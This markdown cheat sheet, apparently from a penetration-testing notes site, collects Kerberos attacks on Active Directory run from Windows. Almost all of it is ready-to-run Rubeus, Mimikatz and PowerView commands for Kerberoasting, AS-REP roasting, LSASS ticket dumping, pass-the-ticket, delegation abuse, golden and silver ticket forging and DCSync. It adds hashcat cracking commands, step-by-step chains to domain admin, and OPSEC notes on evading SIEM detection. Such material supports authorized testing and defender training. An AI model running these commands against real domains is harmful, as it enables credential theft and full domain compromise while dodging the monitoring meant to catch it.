---
title: "Kerberos Attacks — From Windows"
weight: 2
tags:
  - ad
  - kerberos
  - windows
  - rubeus
  - mimikatz
---

## Quick Reference

| Attack | Tool | Prerequisite | Output |
|--------|------|-------------|--------|
| Kerberoasting | Rubeus, PowerView | Domain user, SPN exists | RC4/AES hash → offline crack |
| AS-REP Roasting | Rubeus | Domain user, pre-auth disabled on target | AS-REP hash → offline crack |
| Pass-the-Ticket | Rubeus, Mimikatz | Valid .kirbi or base64 ticket | Ticket injected into session |
| Overpass-the-Hash | Mimikatz, Rubeus | NTLM or AES hash | TGT obtained, ticket injected |
| Pass-the-Key | Mimikatz | AES256 hash | TGT obtained via AES pre-auth |
| Ticket Extraction | Rubeus, Mimikatz | Local admin (for other users' tickets) | .kirbi files / base64 tickets |
| TGT Delegation | Rubeus tgtdeleg | Domain user, no local admin needed | Usable TGT |
| Ticket Harvesting | Rubeus harvest/monitor | Local admin | Ongoing TGT collection |
| Unconstrained Delegation Abuse | Rubeus monitor + coerce | Local admin on delegation host | Victim TGT captured |

---

## Hashcat Cracking Modes Reference

| Mode | Hash Type | Attack Context |
|------|-----------|---------------|
| 13100 | Kerberoast — RC4 (TGS-REP) | Kerberoasting with /rc4opsec |
| 19600 | Kerberoast — AES128 (TGS-REP) | Kerberoasting with /aes |
| 19700 | Kerberoast — AES256 (TGS-REP) | Kerberoasting with /aes |
| 18200 | AS-REP — RC4 (krb5asrep) | AS-REP Roasting |
| 17200 | DPAPI masterkey | Seatbelt / Mimikatz DPAPI |
| 1000 | NTLM | Pass-the-Hash, secretsdump output |
| 5600 | NTLMv2 (Net-NTLMv2) | Responder / NTLM relay capture |
| 7500 | Kerberos 5 AS-REQ (etype 23) | Pre-auth brute force |
| 3000 | LM | Legacy — rarely seen |

---

## Kerberoasting

Kerberoasting requests Kerberos service tickets (TGS-REP) for accounts with a Service Principal Name (SPN) set. The ticket is encrypted with the service account's password hash, enabling offline cracking.

> **Note (OPSEC):** RC4-encrypted ticket requests (etype 23) are flagged by many SIEMs as anomalous if the service account normally uses AES. AES ticket requests (etype 17/18) are stealthier but produce hashes that take significantly longer to crack.

### Rubeus — Kerberoasting

```cmd
REM Kerberoast all SPN accounts, output hashcat-compatible format
Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat

REM Target a single SPN account
Rubeus.exe kerberoast /user:SPN /outfile:targeted.txt /format:hashcat

REM RC4 opsec — downgrade to RC4, avoids AES etype mismatch alerts
REM (only effective if the account supports RC4)
Rubeus.exe kerberoast /rc4opsec /outfile:hashes_rc4.txt /format:hashcat

REM Request AES tickets only (etype 17/18)
Rubeus.exe kerberoast /aes /outfile:hashes_aes.txt /format:hashcat

REM No-wrap — single-line hash output, useful for piping
Rubeus.exe kerberoast /nowrap /format:hashcat

REM Kerberoast with explicit credentials (from non-domain-joined context)
Rubeus.exe kerberoast /creduser:TARGET_DOMAIN\USERNAME /credpassword:PASSWORD /dc:DC_IP /outfile:hashes.txt /format:hashcat

REM Kerberoast and display SPN info
Rubeus.exe kerberoast /stats
```

> **Required privileges:** Any authenticated domain user.

### PowerView — Kerberoasting

```powershell
# Enumerate SPN accounts and immediately request + format tickets
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Select-Object -ExpandProperty Hash

# Save to file
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File -Encoding ASCII tickets.txt

# Classic Invoke-Kerberoast (PowerSploit)
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash

# Target a specific SPN
Invoke-Kerberoast -Identity SPN -OutputFormat Hashcat | Select-Object -ExpandProperty Hash
```

### Manual — .NET Kerberos Ticket Request

Requests a ticket via pure .NET — no extra tools needed:

```powershell
Add-Type -AssemblyName System.IdentityModel

# Request ticket for a specific SPN
$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN"
$ticketBytes = $ticket.GetRequest()
$ticketBase64 = [System.Convert]::ToBase64String($ticketBytes)
Write-Output $ticketBase64
```

### Cracking Kerberoast Hashes

```bash
# hashcat RC4 (mode 13100)
hashcat -m 13100 -a 0 hashes.txt wordlist.txt
hashcat -m 13100 -a 0 hashes.txt wordlist.txt -r rules/best64.rule

# hashcat AES128 (mode 19600)
hashcat -m 19600 -a 0 hashes.txt wordlist.txt

# hashcat AES256 (mode 19700)
hashcat -m 19700 -a 0 hashes.txt wordlist.txt

# John the Ripper
john --format=krb5tgs hashes.txt --wordlist=wordlist.txt
```

---

## AS-REP Roasting

AS-REP Roasting targets accounts with Kerberos pre-authentication disabled (`DONT_REQ_PREAUTH` flag). The KDC returns an AS-REP encrypted with the user's password hash without requiring proof of identity first.

> **Note (OPSEC):** AS-REP roasting generates event ID 4768 (TGT request) on the DC. No credentials are needed to perform the attack — only a valid username list.

### Rubeus — AS-REP Roasting

```cmd
REM Roast all pre-auth disabled accounts
Rubeus.exe asreproast /outfile:asrep.txt /format:hashcat

REM Target a specific user
Rubeus.exe asreproast /user:USERNAME /format:hashcat

REM With explicit credentials (authenticated enumeration of pre-auth disabled accounts)
Rubeus.exe asreproast /creduser:TARGET_DOMAIN\USERNAME /credpassword:PASSWORD /dc:DC_IP /outfile:asrep.txt /format:hashcat

REM No-wrap output
Rubeus.exe asreproast /nowrap /format:hashcat
```

> **Required privileges:** No credentials needed (unauthenticated AS-REP request) if you have a valid username. Authenticated access allows enumeration of all pre-auth disabled accounts via LDAP first.

### PowerView — Find Pre-Auth Disabled Accounts

```powershell
# Enumerate accounts with pre-auth disabled
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname,useraccountcontrol

# Then roast with Rubeus targeting those users
```

### Native — Find Pre-Auth Disabled Accounts

```powershell
# userAccountControl bit 23 = DONT_REQ_PREAUTH (0x400000 = 4194304)
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select-Object Name,SamAccountName
```

### Cracking AS-REP Hashes

```bash
# hashcat (mode 18200)
hashcat -m 18200 asrep.txt wordlist.txt
hashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule --force

# John the Ripper
john --format=krb5asrep asrep.txt --wordlist=wordlist.txt
```

---

## Pass-the-Ticket (PtT)

Pass-the-Ticket injects a Kerberos ticket (.kirbi format or base64-encoded) directly into the current logon session's Kerberos cache, gaining access to services the ticket is valid for.

> **Note (OPSEC):** Ticket injection operates within the current logon session. Injecting a TGT allows requesting new service tickets on behalf of the ticket owner. Use sacrificial sessions (see below) to avoid contaminating your own session.

### Rubeus — Inject Ticket

```cmd
REM Inject from kirbi file
Rubeus.exe ptt /ticket:ticket.kirbi

REM Inject from base64-encoded ticket string
Rubeus.exe ptt /ticket:BASE64_TICKET_STRING

REM Verify currently loaded tickets
Rubeus.exe klist

REM Purge all tickets from current session
Rubeus.exe purge
```

### Mimikatz — Inject Ticket

```
# Pass a kirbi ticket into current session
kerberos::ptt ticket.kirbi

# Import multiple tickets from a directory
kerberos::ptt C:\Tickets\

# List tickets in current session
kerberos::list

# Export tickets from current session to disk
kerberos::list /export

# Purge current session tickets
kerberos::purge
```

### Windows Built-in — Verify and Purge

```cmd
REM List current Kerberos tickets (built-in)
klist

REM Purge all tickets
klist purge
```

---

## Overpass-the-Hash / Pass-the-Key

Overpass-the-Hash (OPtH) converts an NTLM hash into a full Kerberos TGT, avoiding NTLM authentication entirely. Pass-the-Key uses AES keys instead. Both result in a valid TGT injected into a new process.

> **Note (OPSEC):** Mimikatz `sekurlsa::pth` spawns a new process with a sacrificial token. The new process has no existing Kerberos tickets — the first TGT request is visible on the DC (event ID 4768). AES key usage (`/aes256`) blends in better than RC4 (`/ntlm`) since modern environments enforce AES.

### Mimikatz — Overpass-the-Hash (NTLM)

```
# Spawn cmd.exe authenticated as USERNAME using NTLM hash
sekurlsa::pth /user:USERNAME /domain:TARGET_DOMAIN /ntlm:NTLM_HASH /run:cmd.exe

# Spawn PowerShell
sekurlsa::pth /user:USERNAME /domain:TARGET_DOMAIN /ntlm:NTLM_HASH /run:powershell.exe
```

### Mimikatz — Pass-the-Key (AES256)

```
# Spawn cmd.exe using AES256 key — preferred for OPSEC
sekurlsa::pth /user:USERNAME /domain:TARGET_DOMAIN /aes256:AES256_HASH /run:cmd.exe

# Combine AES256 + NTLM for maximum compatibility
sekurlsa::pth /user:USERNAME /domain:TARGET_DOMAIN /aes256:AES256_HASH /ntlm:NTLM_HASH /run:cmd.exe
```

### Rubeus — Overpass-the-Hash (RC4 / NTLM)

```cmd
REM Request TGT with NTLM hash and inject into current session
Rubeus.exe asktgt /user:USERNAME /rc4:NTLM_HASH /domain:TARGET_DOMAIN /ptt

REM Request TGT and save to file (do not inject)
Rubeus.exe asktgt /user:USERNAME /rc4:NTLM_HASH /domain:TARGET_DOMAIN /outfile:USERNAME.kirbi

REM Specify DC explicitly
Rubeus.exe asktgt /user:USERNAME /rc4:NTLM_HASH /domain:TARGET_DOMAIN /dc:DC_IP /ptt
```

### Rubeus — Pass-the-Key (AES256)

```cmd
REM Request TGT using AES256 key and inject
Rubeus.exe asktgt /user:USERNAME /aes256:AES256_HASH /domain:TARGET_DOMAIN /ptt

REM Save to file
Rubeus.exe asktgt /user:USERNAME /aes256:AES256_HASH /domain:TARGET_DOMAIN /dc:DC_IP /outfile:USERNAME.kirbi

REM Request with AES128
Rubeus.exe asktgt /user:USERNAME /aes128:AES128_HASH /domain:TARGET_DOMAIN /ptt
```

---

## Ticket Extraction from Memory

Extracting tickets from memory requires local admin on the target host. Rubeus reads directly from LSASS; Mimikatz does the same via `sekurlsa`.

> **Note (OPSEC):** Any direct LSASS access is heavily monitored. Credential Guard (available on Windows 10/11 and Server 2016+) prevents LSASS from storing extractable Kerberos ticket data. Use `Rubeus dump` for less invasive extraction than Mimikatz's `sekurlsa::logonpasswords`.

### Rubeus — Dump Tickets

```cmd
REM Dump all tickets from all logon sessions
Rubeus.exe dump

REM Dump tickets from a specific logon session (LUID)
Rubeus.exe dump /luid:0x3e7

REM Dump only TGTs (krbtgt service tickets)
Rubeus.exe dump /service:krbtgt

REM Dump tickets for a specific user
Rubeus.exe dump /user:USERNAME

REM Dump and save to files
Rubeus.exe dump /nowrap
```

### Mimikatz — Ticket Extraction

```
# List all tickets in current session
kerberos::list

# Export all tickets to disk as .kirbi files
kerberos::list /export

# Dump tickets from all sessions (requires local admin)
sekurlsa::tickets

# Export tickets from all sessions
sekurlsa::tickets /export

# Full credential dump (NTLM hashes + Kerberos keys)
sekurlsa::logonpasswords
```

---

## TGT Delegation Trick — Rubeus tgtdeleg

`tgtdeleg` abuses the Kerberos unconstrained delegation mechanism to obtain a usable TGT for the current user without requiring local admin. It works by requesting a forwardable TGT via the `S4U2Self` mechanism against a target SPN.

> **Note (OPSEC):** This is one of the stealthiest ways to obtain a TGT when you have a shell but no local admin. The request looks like normal Kerberos delegation traffic.

```cmd
REM Request forwardable TGT for current user against a target SPN
Rubeus.exe tgtdeleg /target:SPN

REM Example — target CIFS on a server
Rubeus.exe tgtdeleg /target:cifs/DC_HOSTNAME.TARGET_DOMAIN

REM Pipe output to ptt
Rubeus.exe tgtdeleg /target:SPN /nowrap
```

The resulting base64 ticket can then be injected:

```cmd
Rubeus.exe ptt /ticket:BASE64_TICKET_OUTPUT_FROM_TGTDELEG
```

---

## Sacrificial Logon Session — createnetonly

By default, Rubeus and Mimikatz operations inject tickets into the current logon session. This contaminates the session and can lead to detection or authentication conflicts. Using a sacrificial session isolates the injected ticket.

> **Note (OPSEC):** Always prefer sacrificial sessions when injecting foreign tickets. The new process has a blank Kerberos cache — injection into it is clean and does not affect your primary working session.

```cmd
REM Create a sacrificial logon session (hidden) with cmd.exe
REM A new LUID is printed — note it down
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe

REM Create with visible window for interactive use
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show

REM Inject a ticket into the new session by LUID
Rubeus.exe ptt /ticket:ticket.kirbi /luid:0x12345

REM Inject base64 ticket
Rubeus.exe ptt /ticket:BASE64_TICKET /luid:0x12345

REM Then steal the token from the new process to operate within it
Rubeus.exe createnetonly /program:cmd.exe /show /ticket:ticket.kirbi
```

Combined workflow:

```cmd
REM Step 1 — create sacrificial session
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show

REM Step 2 — note the LUID printed (e.g. 0x8f4a2)

REM Step 3 — inject target ticket into the sacrificial session
Rubeus.exe ptt /ticket:DA_TICKET.kirbi /luid:0x8f4a2

REM Step 4 — interact with the new window (it now has the injected identity)
```

---

## Ticket Monitoring and Harvesting

These techniques continuously collect Kerberos tickets from LSASS — useful on high-value hosts (DCs, servers) where privileged users authenticate regularly.

> **Note (OPSEC):** Harvesting requires local admin and generates sustained LSASS access. This is aggressive and will likely be detected on monitored hosts. Use with extreme caution.

```cmd
REM Monitor for new TGTs every 30 seconds (indefinite)
Rubeus.exe harvest /interval:30

REM Monitor every 10 seconds and filter to a specific target user
Rubeus.exe monitor /interval:10 /targetuser:DA_USERNAME

REM Monitor and save harvested tickets to a directory
Rubeus.exe harvest /interval:30 /outfile:harvested.kirbi

REM Monitor with specific output path
Rubeus.exe monitor /interval:5 /runfor:120 /outfile:C:\Users\Public\tgts.kirbi
```

---

## Unconstrained Delegation Abuse

Computers configured with unconstrained delegation cache TGTs of any user who authenticates to them. If you compromise such a machine and can coerce a privileged user (or the DC machine account) to authenticate to it, you capture their TGT.

> **Required privileges:** Local admin on the unconstrained delegation host.

### Step 1 — Find Unconstrained Delegation Hosts

```powershell
# PowerView
Get-DomainComputer -Unconstrained | Select-Object name,dnshostname

# Native AD cmdlet
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation | Select-Object Name,DNSHostName
```

### Step 2 — Start Ticket Monitor on the Delegation Host

```cmd
REM On the compromised unconstrained delegation host, monitor for incoming TGTs
Rubeus.exe monitor /interval:5 /targetuser:DC_HOSTNAME$
```

### Step 3 — Coerce DC Authentication (from another host or tool)

Trigger the DC to authenticate to the unconstrained delegation host. This can be done with `MS-RPRN` (printerbug), `MS-EFSR` (PetitPotam, unauth in some versions), or other coercion primitives. This is typically run from a Linux attacker host or a different Windows host.

### Step 4 — Inject Captured DC Machine TGT

```cmd
REM Once the DC$ TGT appears in Rubeus monitor output, inject it
Rubeus.exe ptt /ticket:BASE64_DC_TGT

REM Then perform DCSync using Mimikatz or secretsdump
```

---

## Kerberos Double-Hop Problem and Solutions

When you have a remote session (PSRemoting, WinRM) and try to access a third resource from that session, Kerberos credentials are not forwarded — this is the double-hop problem. Kerberos tickets cannot be delegated over a second hop by default.

### Problem Demonstration

```powershell
# You have a PSRemoting session to SERVER_A
Enter-PSSession -ComputerName SERVER_A -Credential $creds

# Inside SERVER_A, this fails — no Kerberos ticket available to authenticate to SERVER_B
Get-ChildItem \\SERVER_B\Share
```

### Solution 1 — Rubeus createnetonly + ptt on Target

```cmd
REM On SERVER_A, create a sacrificial session and inject a ticket obtained by other means
Rubeus.exe createnetonly /program:cmd.exe /show
Rubeus.exe ptt /ticket:TICKET.kirbi /luid:0xNEWLUID
```

### Solution 2 — Explicit PSCredential Object

```powershell
# Pass credentials explicitly rather than relying on Kerberos delegation
$cred = New-Object System.Management.Automation.PSCredential("TARGET_DOMAIN\USERNAME", (ConvertTo-SecureString "PASSWORD" -AsPlainText -Force))

Invoke-Command -ComputerName SERVER_B -Credential $cred -ScriptBlock { whoami }

# Or mount the share with explicit credentials
New-PSDrive -Name Z -PSProvider FileSystem -Root \\SERVER_B\Share -Credential $cred
```

### Solution 3 — CredSSP (Not Recommended)

CredSSP forwards cleartext credentials to the remote host. Avoid unless absolutely necessary — it stores credentials in memory on the remote system.

```powershell
# Enable CredSSP on client
Enable-WSManCredSSP -Role Client -DelegateComputer "*.TARGET_DOMAIN"

# Enable on server
Enable-WSManCredSSP -Role Server

# Connect with CredSSP
Enter-PSSession -ComputerName SERVER_A -Credential $creds -Authentication Credssp
```

### Solution 4 — Constrained Delegation Configured

If the intermediate server is configured for constrained delegation to the target resource, Kerberos handles it natively via S4U2Proxy. No additional steps needed — the delegation is automatic.

---

## S4U2Self / S4U2Proxy Abuse (Constrained Delegation)

If a service account or computer account is configured for constrained delegation (allowed to delegate to specific SPNs), you can abuse this to impersonate any user to those services.

> **Required privileges:** Control of the delegating account (its password hash or AES key).

```cmd
REM Step 1 — get a TGT for the delegating account
Rubeus.exe asktgt /user:SVC_ACCOUNT /rc4:NTLM_HASH /domain:TARGET_DOMAIN /outfile:svc.kirbi

REM Step 2 — request a TGS impersonating Administrator to the delegated SPN
REM (uses S4U2Self to get a forwardable ticket, then S4U2Proxy to the target SPN)
Rubeus.exe s4u /ticket:svc.kirbi /impersonateuser:Administrator /msdsspn:SPN /ptt

REM Example — impersonate Administrator to CIFS on DC
Rubeus.exe s4u /ticket:svc.kirbi /impersonateuser:Administrator /msdsspn:cifs/DC_HOSTNAME.TARGET_DOMAIN /ptt

REM If protocol transition is allowed (TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION flag):
Rubeus.exe s4u /user:SVC_ACCOUNT /rc4:NTLM_HASH /domain:TARGET_DOMAIN /impersonateuser:Administrator /msdsspn:SPN /ptt

REM Alternate service — rewrite the SPN in the ticket to access different services
Rubeus.exe s4u /ticket:svc.kirbi /impersonateuser:Administrator /msdsspn:cifs/DC_HOSTNAME /altservice:host /ptt
```

---

## Resource-Based Constrained Delegation (RBCD)

If you have `GenericWrite` or `WriteProperty` over a computer object, you can configure RBCD to impersonate any user to that computer.

> **Required privileges:** `GenericWrite` or `WriteProperty` on the target computer object.

```powershell
# Step 1 — Add a controlled computer account (or use an existing one you control)
# Assuming you have already added a computer via MachineAccountQuota or addcomputer.py

# Step 2 — Set msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer
$ControlledComputer = Get-ADComputer -Identity "EVIL_COMPUTER$"
$TargetComputer = Get-ADComputer -Identity "TARGET_COMPUTER"

Set-ADComputer $TargetComputer -PrincipalsAllowedToDelegateToAccount $ControlledComputer

# Verify
Get-ADComputer TARGET_COMPUTER -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

```cmd
REM Step 3 — request a TGT for the controlled computer account
Rubeus.exe asktgt /user:EVIL_COMPUTER$ /rc4:NTLM_HASH_OF_EVIL_COMPUTER /domain:TARGET_DOMAIN /outfile:evil.kirbi

REM Step 4 — perform S4U2Self + S4U2Proxy to impersonate Administrator on the target
Rubeus.exe s4u /ticket:evil.kirbi /impersonateuser:Administrator /msdsspn:cifs/TARGET_COMPUTER.TARGET_DOMAIN /ptt
```

---

## Golden and Silver Ticket Forging

### Silver Ticket

A Silver Ticket forges a TGS (service ticket) for a specific service using the service account's NTLM hash. It does not touch the DC after forging.

> **Required privileges:** Service account NTLM hash (from secretsdump, Mimikatz, or dump).

```
# Mimikatz — forge silver ticket
kerberos::golden /user:Administrator /domain:TARGET_DOMAIN /sid:DOMAIN_SID /target:DC_HOSTNAME.TARGET_DOMAIN /service:cifs /rc4:NTLM_HASH /ptt

# CIFS service — file access
kerberos::golden /user:Administrator /domain:TARGET_DOMAIN /sid:DOMAIN_SID /target:DC_HOSTNAME.TARGET_DOMAIN /service:cifs /rc4:NTLM_HASH /ptt

# HOST service — task scheduler, WMI
kerberos::golden /user:Administrator /domain:TARGET_DOMAIN /sid:DOMAIN_SID /target:DC_HOSTNAME.TARGET_DOMAIN /service:host /rc4:NTLM_HASH /ptt

# HTTP service
kerberos::golden /user:Administrator /domain:TARGET_DOMAIN /sid:DOMAIN_SID /target:DC_HOSTNAME.TARGET_DOMAIN /service:http /rc4:NTLM_HASH /ptt
```

```cmd
REM Rubeus — forge silver ticket
Rubeus.exe silver /user:Administrator /domain:TARGET_DOMAIN /sid:DOMAIN_SID /target:DC_HOSTNAME.TARGET_DOMAIN /service:cifs /rc4:NTLM_HASH /ptt
```

### Golden Ticket

A Golden Ticket forges a TGT using the `krbtgt` account's NTLM hash. It grants complete domain access. The `krbtgt` hash is obtained via DCSync or from NTDS.dit.

> **Required privileges:** `krbtgt` NTLM hash (requires DCSync rights or Domain Admin).

```
# Mimikatz — obtain krbtgt hash via DCSync (requires DS-Replication-Get-Changes-All)
lsadump::dcsync /user:TARGET_DOMAIN\krbtgt /domain:TARGET_DOMAIN

# Mimikatz — forge golden ticket and inject
kerberos::golden /user:Administrator /domain:TARGET_DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_NTLM_HASH /ptt

# Forge with specific user ID
kerberos::golden /user:Administrator /domain:TARGET_DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_NTLM_HASH /id:500 /ptt

# Save golden ticket to file instead of injecting
kerberos::golden /user:Administrator /domain:TARGET_DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_NTLM_HASH /ticket:golden.kirbi
```

```cmd
REM Rubeus — forge and inject golden ticket
Rubeus.exe golden /user:Administrator /domain:TARGET_DOMAIN /sid:DOMAIN_SID /rc4:KRBTGT_NTLM_HASH /ptt

REM With AES256 key (stealthier, matches modern DC behavior)
Rubeus.exe golden /user:Administrator /domain:TARGET_DOMAIN /sid:DOMAIN_SID /aes256:KRBTGT_AES256_HASH /ptt
```

> **Note (OPSEC):** Golden tickets forged with RC4 on a domain that enforces AES encryption will be detected (event ID 4769 with etype 23 where AES is expected). Use the krbtgt AES256 key for stealth.

---

## DCSync

DCSync simulates a Domain Controller requesting replication data, pulling NTLM hashes and Kerberos keys for any account without touching LSASS on the DC.

> **Required privileges:** `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` (held by Domain Admins, Enterprise Admins, and accounts explicitly granted DCSync rights).

```
# Mimikatz — DCSync for a single account
lsadump::dcsync /user:TARGET_DOMAIN\Administrator /domain:TARGET_DOMAIN

# DCSync for krbtgt (golden ticket preparation)
lsadump::dcsync /user:TARGET_DOMAIN\krbtgt /domain:TARGET_DOMAIN

# DCSync all accounts (slow, noisy)
lsadump::dcsync /domain:TARGET_DOMAIN /all /csv
```

```cmd
REM Rubeus does not perform DCSync directly — use Mimikatz or secretsdump

REM After obtaining a TGT for an account with DCSync rights via Rubeus ptt,
REM run Mimikatz dcsync in the same session
```

---

## Common Kerberos Attack Chain Examples

### Chain 1 — Kerberoast to Local Admin

```cmd
REM 1. Enumerate SPN accounts
Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat

REM 2. Crack offline
REM hashcat -m 13100 hashes.txt wordlist.txt

REM 3. Use cracked credentials for lateral movement (PSExec, WinRM, etc.)
```

### Chain 2 — AS-REP Roast to DA

```cmd
REM 1. Enumerate pre-auth disabled accounts
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

REM 2. Crack offline
REM hashcat -m 18200 asrep.txt wordlist.txt

REM 3. Use credentials, check BloodHound for escalation path to DA
```

### Chain 3 — OPtH to DCSync

```cmd
REM 1. Obtain NTLM hash from secretsdump or Mimikatz on a compromised host
REM 2. Create sacrificial session
Rubeus.exe createnetonly /program:cmd.exe /show

REM 3. Request TGT with hash
Rubeus.exe asktgt /user:USERNAME /rc4:NTLM_HASH /domain:TARGET_DOMAIN /ptt /luid:0xNEWLUID

REM 4. From the new session, run Mimikatz DCSync
REM lsadump::dcsync /user:TARGET_DOMAIN\krbtgt
```

### Chain 4 — Unconstrained Delegation + Coerce to DA

```cmd
REM 1. Compromise unconstrained delegation host
REM 2. Start Rubeus monitor
Rubeus.exe monitor /interval:5 /targetuser:DC_HOSTNAME$

REM 3. Coerce DC authentication (printerbug / PetitPotam from attack host)

REM 4. Capture DC$ TGT in Rubeus monitor output

REM 5. Inject DC$ TGT
Rubeus.exe ptt /ticket:BASE64_DC_TGT

REM 6. DCSync using DC$ machine account identity
REM lsadump::dcsync /user:TARGET_DOMAIN\krbtgt
```

---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.
